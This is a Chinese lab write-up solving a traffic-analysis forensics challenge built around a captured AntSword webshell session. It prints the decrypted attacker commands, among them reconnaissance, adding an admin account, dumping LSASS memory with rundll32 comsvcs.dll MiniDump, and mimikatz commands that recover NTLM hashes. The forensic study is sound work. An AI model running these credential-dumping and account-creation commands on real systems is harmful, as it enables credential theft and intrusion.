# 第六章-流量特征分析-蚂蚁爱上树

  
  
&lt;!--more--&gt;  
## 0x00 环境分析  
```txt  
1. 管理员Admin账号的密码是什么？  
2. LSASS.exe的程序进程ID是多少？  
3. 用户WIN101的密码是什么?  
```  
## 0x01  
`/onlineshop/product2.php`蚁剑马，对流量进行解密  
```bash  
cd /d &#34;C:/phpStudy/PHPTutorial/WWW/onlineshop&#34;&amp;ls&amp;echo [S]&amp;cd&amp;echo [E]  
cd /d &#34;C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop&#34;&amp;dir&amp;echo [S]&amp;cd&amp;echo [E]  
cd /d &#34;C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop&#34;&amp;whoami&amp;echo [S]&amp;cd&amp;echo [E]  
cd /d &#34;C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop&#34;&amp;whoami /priv&amp;echo [S]&amp;cd&amp;echo [E]  
cd /d &#34;C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop&#34;&amp;systeminfo&amp;echo [S]&amp;cd&amp;echo [E]  
cd /d &#34;C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop&#34;&amp;dir c:\&amp;echo [S]&amp;cd&amp;echo [E]  
cd /d &#34;C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop&#34;&amp;dir c:\temp&amp;echo [S]&amp;cd&amp;echo [E]  
cd /d &#34;C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop&#34;&amp;net user&amp;echo [S]&amp;cd&amp;echo [E]  
cd /d &#34;C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop&#34;&amp;net localgroup administrators&amp;echo [S]&amp;cd&amp;echo [E]  
cd /d &#34;C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop&#34;&amp;net group &#34;domain group&#34; /domain&amp;echo [S]&amp;cd&amp;echo [E]  
cd /d &#34;C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop&#34;&amp;net group &#34;domain admins&#34; /domain&amp;echo [S]&amp;cd&amp;echo [E]  
cd /d &#34;C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop&#34;&amp;net view&amp;echo [S]&amp;cd&amp;echo [E]  
cd /d &#34;C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop&#34;&amp;net share&amp;echo [S]&amp;cd&amp;echo [E]  
cd /d &#34;C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop&#34;&amp;rundll32.exe comsvcs.dll, MiniDump 852 C:\Temp\OnlineShopBackup.zip full&amp;echo [S]&amp;cd&amp;echo [E]  
cd /d &#34;C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop&#34;&amp;net localgroup administrators admin /add&amp;echo [S]&amp;cd&amp;echo [E]  
```  
1、管理员Admin账号的密码是什么？  
`cd /d &#34;C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop&#34;&amp;net user admin Password1 /add&amp;echo [S]&amp;cd&amp;echo [E]`  
根据上面流量，得到是`Password1`  
`flag{Password1}`  
2、LSASS.exe的程序进程ID是多少？  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011906565.png)
解密流量得到  
`cd /d &#34;C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop&#34;&amp;rundll32.exe comsvcs.dll, MiniDump 852 C:\Temp\OnlineShopBackup.zip full&amp;echo [S]&amp;cd&amp;echo [E]`  
https://zhuanlan.zhihu.com/p/346022067  
其中  
`rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump pid lsass.dmp full&#34;`  
`flag{852}`  
3、用户WIN101的密码是什么?  
下载上面得到的lsass进程  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011924805.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011924281.png)
在这里进行了文件读取的操作，将回显下载下来  
选择原始数据进行导出  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406012001733.png)
删除前面多余的字符便是正常的 dmp 文件  
利用`mimikatz`进行解密  
`sekurlsa::minidump lsass.dmp`  
`sekurlsa::logonpasswords`  
```cmd  
SID               : S-1-5-21-3374851086-947483859-3378876003-1103  
        msv :  
         [00000003] Primary  
         * Username : win101  
         * Domain   : VULNTARGET  
         * NTLM     : 282d975e35846022476068ab5a3d72df  
         * SHA1     : bc9ecca8d006d8152bd51db558221a0540c9d604  
         * DPAPI    : 8d6103509e746ac0ed9641f7c21d7cf7  
        tspkg :  
        wdigest :  
         * Username : win101  
         * Domain   : VULNTARGET  
         * Password : (null)  
        kerberos :  
         * Username : win101  
         * Domain   : VULNTARGET.COM  
         * Password : (null)  
        ssp :  
        credman :  
        cloudap :  
  
Authentication Id : 0 ; 995 (00000000:000003e3)  
Session           : Service from 0  
User Name         : IUSR  
Domain            : NT AUTHORITY  
Logon Server      : (null)  
Logon Time        : 2023/10/19 11:26:36  
SID               : S-1-5-17  
```  
解密一下`NTLM`  
得到密码  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406012004146.png)
`flag{admin#123}`  

---

> Author: N1Rvana  
> URL: http://localhost:1313/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E8%9A%82%E8%9A%81%E7%88%B1%E4%B8%8A%E6%A0%91/  

